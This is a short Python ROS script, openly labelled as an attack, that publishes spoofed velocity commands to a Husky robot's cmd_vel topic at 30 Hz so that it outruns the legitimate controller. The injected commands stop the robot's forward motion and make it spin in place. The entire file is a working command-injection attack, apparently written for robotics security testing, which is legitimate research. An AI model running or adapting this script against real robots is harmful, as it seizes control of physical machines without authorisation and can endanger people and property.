#!/usr/bin/env python3

import rospy
from geometry_msgs.msg import Twist
import sys

def cmd_vel_attack():

    try:
        rospy.init_node('cmd_vel_attacker', anonymous=True)
        pub = rospy.Publisher('/husky_velocity_controller/cmd_vel', Twist, queue_size=10)
        rate = rospy.Rate(30)  # Publish faster than legitimate node
        
        attack_cmd = Twist()
        attack_cmd.linear.x = 0.0      # Stop command
        attack_cmd.angular.z = 2.0     # Spin in place
        
        rospy.loginfo("[ATTACK] CMD_VEL injection started - Publishing malicious commands at 30Hz")
        rospy.loginfo("[ATTACK] Injecting: linear.x=0.0 (STOP), angular.z=2.0 (SPIN)")
        
        while not rospy.is_shutdown():
            pub.publish(attack_cmd)
            rate.sleep()
            
    except rospy.ROSInterruptException:
        rospy.loginfo("[ATTACK] CMD_VEL injection stopped")
    except Exception as e:
        rospy.logerr(f"[ATTACK] CMD_VEL attack failed: {str(e)}")

if __name__ == '__main__':
    cmd_vel_attack()
